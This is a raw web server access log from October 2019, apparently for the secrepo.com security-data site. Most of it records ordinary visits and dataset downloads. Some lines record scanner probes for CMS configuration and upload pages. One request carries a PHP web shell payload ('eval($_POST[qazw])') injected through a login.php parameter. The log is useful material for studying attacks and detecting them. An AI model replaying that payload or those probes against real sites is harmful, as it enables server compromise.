112.74.109.62 - - [30/Oct/2019:01:48:22 -0700] "GET /eWebEditor/php/upload.php HTTP/1.1" 404 294 "http://www.secrepo.com/eWebEditor/php/upload.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
46.119.114.102 - - [30/Oct/2019:09:50:27 -0700] "GET / HTTP/1.1" 200 47148 "https://www.antiguainvestments.com/" "Opera/9.01 (Windows NT 5.1; U; en)" 
46.119.114.102 - - [30/Oct/2019:09:50:27 -0700] "GET / HTTP/1.1" 200 47148 "https://www.antiguainvestments.com/" "Opera/9.01 (Windows NT 5.1; U; en)" 
46.119.114.102 - - [30/Oct/2019:09:50:28 -0700] "GET / HTTP/1.1" 200 47148 "https://www.antiguainvestments.com/" "Opera/9.01 (Windows NT 5.1; U; en)" 
113.171.224.176 - - [30/Oct/2019:09:53:56 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
72.81.228.32 - - [30/Oct/2019:10:02:47 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:47 -0700] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:47 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:47 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:47 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:55 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:55 -0700] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:55 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:55 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:55 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
72.81.228.32 - - [30/Oct/2019:10:02:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:03:38 -0700] "GET / HTTP/1.1" 200 12618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:03:38 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:03:38 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:03:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:03:39 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
122.183.16.166 - - [30/Oct/2019:10:10:10 -0700] "GET /self.logs/ HTTP/1.1" 200 19034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
152.231.124.70 - - [30/Oct/2019:10:10:34 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
157.55.39.142 - - [30/Oct/2019:10:16:04 -0700] "GET /self.logs/access.log.2017-06-05.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
220.181.51.120 - - [30/Oct/2019:10:18:47 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
220.181.51.85 - - [30/Oct/2019:10:18:47 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
213.144.115.26 - - [30/Oct/2019:10:31:30 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
51.218.89.83 - - [30/Oct/2019:10:35:08 -0700] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
51.218.89.83 - - [30/Oct/2019:10:35:09 -0700] "GET / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
69.247.2.240 - - [30/Oct/2019:10:36:49 -0700] "GET / HTTP/1.1" 200 12621 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:36:49 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
64.233.172.11 - - [30/Oct/2019:10:38:38 -0700] "GET / HTTP/1.1" 200 12621 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
64.233.172.13 - - [30/Oct/2019:10:38:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
69.247.2.240 - - [30/Oct/2019:10:44:36 -0700] "GET / HTTP/1.1" 200 12621 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:44:36 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:44:57 -0700] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20692 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:47:18 -0700] "GET /self.logs/ HTTP/1.1" 200 19034 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
69.247.2.240 - - [30/Oct/2019:10:47:18 -0700] "GET /favicon.ico HTTP/1.1" 200 279 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
117.198.102.130 - - [30/Oct/2019:10:48:23 -0700] "GET /self.logs/error.log.2019-10-13 HTTP/1.1" 200 262 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362" 
69.247.2.240 - - [30/Oct/2019:10:48:58 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 547221453 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
66.249.88.111 - - [30/Oct/2019:10:52:44 -0700] "GET / HTTP/1.1" 200 12620 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
66.249.88.109 - - [30/Oct/2019:10:52:44 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
66.249.88.107 - - [30/Oct/2019:10:52:44 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
66.249.88.107 - - [30/Oct/2019:10:52:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
54.221.199.147 - - [30/Oct/2019:10:53:25 -0700] "GET / HTTP/1.1" 200 12576 "-" "Mozilla/5.0 (compatible; Embedly/0.2; +http://support.embed.ly/)" 
54.221.199.147 - - [30/Oct/2019:10:53:25 -0700] "GET /favicon.ico HTTP/1.1" 200 224 "-" "Mozilla/5.0 (compatible; Embedly/0.2; snap; +http://support.embed.ly/)" 
54.225.104.196 - - [30/Oct/2019:10:53:25 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 580 "-" "Mozilla/5.0 (compatible; Embedly/0.2; snap; +http://support.embed.ly/)" 
52.1.109.34 - - [30/Oct/2019:10:53:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 587 "-" "Embedly +support@embed.ly" 
64.233.172.13 - - [30/Oct/2019:10:56:49 -0700] "GET /self.logs/ HTTP/1.1" 200 19034 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
113.171.224.176 - - [30/Oct/2019:10:56:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
51.15.83.31 - - [30/Oct/2019:11:20:27 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
51.15.83.31 - - [30/Oct/2019:11:20:51 -0700] "GET / HTTP/1.1" 200 12621 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
51.15.83.31 - - [30/Oct/2019:11:21:03 -0700] "GET /data HTTP/1.1" 301 483 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
51.15.83.31 - - [30/Oct/2019:11:21:04 -0700] "GET /data HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
185.175.32.249 - - [30/Oct/2019:11:26:59 -0700] "GET / HTTP/1.1" 200 12621 "android-app://com.Slack" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36" 
185.175.32.249 - - [30/Oct/2019:11:27:00 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36" 
185.175.32.249 - - [30/Oct/2019:11:27:00 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36" 
185.175.32.249 - - [30/Oct/2019:11:27:00 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36" 
185.175.32.249 - - [30/Oct/2019:11:27:02 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36" 
185.175.32.249 - - [30/Oct/2019:11:27:26 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36" 
34.226.121.251 - - [30/Oct/2019:11:29:23 -0700] "GET / HTTP/1.1" 206 12670 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
34.226.121.251 - - [30/Oct/2019:11:29:23 -0700] "GET /bootstrap/img/apple-touch-icon.png HTTP/1.1" 404 271 "-" "Slackbot 1.0 (+https://api.slack.com/robots)" 
34.226.121.251 - - [30/Oct/2019:11:29:23 -0700] "GET /favicon.ico HTTP/1.1" 200 279 "-" "Slackbot 1.0 (+https://api.slack.com/robots)" 
153.104.35.122 - - [30/Oct/2019:11:29:27 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 549157648 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
18.237.137.164 - - [30/Oct/2019:11:31:14 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 164980 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
123.125.71.38 - - [30/Oct/2019:11:31:44 -0700] "GET / HTTP/1.1" 200 12584 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
111.206.221.24 - - [30/Oct/2019:11:31:45 -0700] "GET /css/style.css HTTP/1.1" 404 250 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
58.55.198.91 - - [30/Oct/2019:11:35:58 -0700] "HEAD //include/dialog/select_soft_post.php HTTP/1.1" 404 275 "-" "-" 
58.55.198.159 - - [30/Oct/2019:11:37:18 -0700] "HEAD //include/dialog/select_soft_post.php HTTP/1.1" 301 258 "-" "-" 
37.228.251.83 - - [30/Oct/2019:11:50:13 -0700] "GET / HTTP/1.1" 200 12621 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
37.228.251.83 - - [30/Oct/2019:11:50:13 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
40.77.167.120 - - [30/Oct/2019:11:56:26 -0700] "GET /self.logs/access.log.2017-03-23.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [30/Oct/2019:11:59:44 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
37.14.136.151 - - [30/Oct/2019:12:27:38 -0700] "GET / HTTP/1.1" 200 12620 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
37.14.136.151 - - [30/Oct/2019:12:27:39 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
37.14.136.151 - - [30/Oct/2019:12:27:39 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
37.14.136.151 - - [30/Oct/2019:12:27:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
37.14.136.151 - - [30/Oct/2019:12:27:39 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
123.125.67.227 - - [30/Oct/2019:12:30:35 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
106.36.160.157 - - [30/Oct/2019:12:31:11 -0700] "HEAD //tags.php HTTP/1.1" 404 275 "-" "-" 
106.36.160.157 - - [30/Oct/2019:12:31:12 -0700] "HEAD //config/AspCms_config.asp HTTP/1.1" 404 275 "-" "-" 
106.36.160.157 - - [30/Oct/2019:12:31:12 -0700] "HEAD //include/dialog/select_soft_post.php HTTP/1.1" 404 275 "-" "-" 
153.104.35.122 - - [30/Oct/2019:12:49:22 -0700] "GET / HTTP/1.1" 200 12621 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
153.104.35.122 - - [30/Oct/2019:12:49:22 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
153.104.35.122 - - [30/Oct/2019:12:49:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
52.11.64.146 - - [30/Oct/2019:12:51:04 -0700] "GET / HTTP/1.1" 200 47148 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
153.104.35.122 - - [30/Oct/2019:12:53:08 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420883 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
113.171.224.176 - - [30/Oct/2019:13:02:30 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
153.104.35.122 - - [30/Oct/2019:13:15:29 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420883 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
139.198.4.220 - - [30/Oct/2019:13:17:46 -0700] "GET /login.php?makehtml=1&chdb%5Bhtmlname%5D=gzljc.php&chdb%5Bpath%5D=cache&content=%3C?php%20echo%20md5(1);%20eval($_POST%5Bqazw%5D);?%3E HTTP/1.1" 404 294 "-" "python-requests/2.22.0" 
139.198.4.220 - - [30/Oct/2019:13:17:46 -0700] "GET /cache/gzljc.php HTTP/1.1" 404 294 "-" "python-requests/2.22.0" 
121.226.183.151 - - [30/Oct/2019:13:22:46 -0700] "POST /config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com/config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:46 -0700] "POST /config/AspCms_Config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:46 -0700] "POST /config/AspCms_Config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:47 -0700] "POST /config/AspCms_Config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:47 -0700] "POST /config/AspCms_Config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:47 -0700] "POST /config/AspCms_Config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:47 -0700] "POST /sqzr.asp HTTP/1.1" 404 271 "http://www.secrepo.com/sqzr.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:47 -0700] "POST /config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:48 -0700] "POST /inc/config.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:48 -0700] "POST /inc/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:48 -0700] "POST /inc/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:48 -0700] "POST /inc/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:49 -0700] "POST /inc/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:49 -0700] "POST /include/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/include/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:49 -0700] "POST /include/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/include/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:49 -0700] "POST /include/md5.asp HTTP/1.1" 404 271 "http://www.secrepo.com/include/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:49 -0700] "POST /inc/Function.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/Function.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
121.226.183.151 - - [30/Oct/2019:13:22:50 -0700] "POST /inc/Function.asp HTTP/1.1" 404 271 "http://www.secrepo.com/inc/Function.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
23.125.219.22 - - [30/Oct/2019:13:22:56 -0700] "GET /Security-Data-Analysis/Lab_2/http.log.zip HTTP/1.1" 200 53279490 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Avast/77.1.1829.91" 
